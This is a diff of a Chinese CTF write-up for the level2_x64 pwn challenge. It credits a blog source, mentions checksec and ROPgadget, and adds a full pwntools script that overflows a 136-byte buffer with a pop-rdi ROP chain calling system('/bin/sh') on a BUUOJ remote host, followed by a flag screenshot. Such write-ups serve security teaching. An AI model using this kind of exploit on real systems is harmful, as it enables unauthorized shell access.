@@ -1,5 +1,9 @@
 **新手上路，欢迎交流指错**
 
+ **参考与致谢**  
+> 本题解题思路参考了以下资源，感谢原作者的分享：
+>https://www.cnblogs.com/nemuzuki/p/17218722.html 作者：无眠之月
+
 依旧先checksec
 
 <img width="367" height="153" alt="image" src="https://github.com/user-attachments/assets/a7ba4c56-61f7-42d1-94c4-b0b46901970d" />
@@ -41,4 +45,22 @@ ROPgadget --binary ./level2_x64 --only "pop|ret"
 看来我要找的地址就决定是你了! 0x4006b3
 
 构造脚本
+
 ```python
+from pwn import *
+r=remote("node5.buuoj.cn",25976)
+
+system_addr=0x4004C0
+bin_sh_addr=0x600A90
+pop_rid_ret_addr=0x4006b3
+
+payload=b"A"*136+p64(pop_rid_ret_addr)+p64(bin_sh_addr)+p64(system_addr)
+
+r.sendlineafter("put:\n",payload)
+
+r.interactive()
+```
+
+成功拿到flag
+
+<img width="596" height="120" alt="image" src="https://github.com/user-attachments/assets/4c12e1e2-9277-44f9-87e6-2b1d76203e8a" />
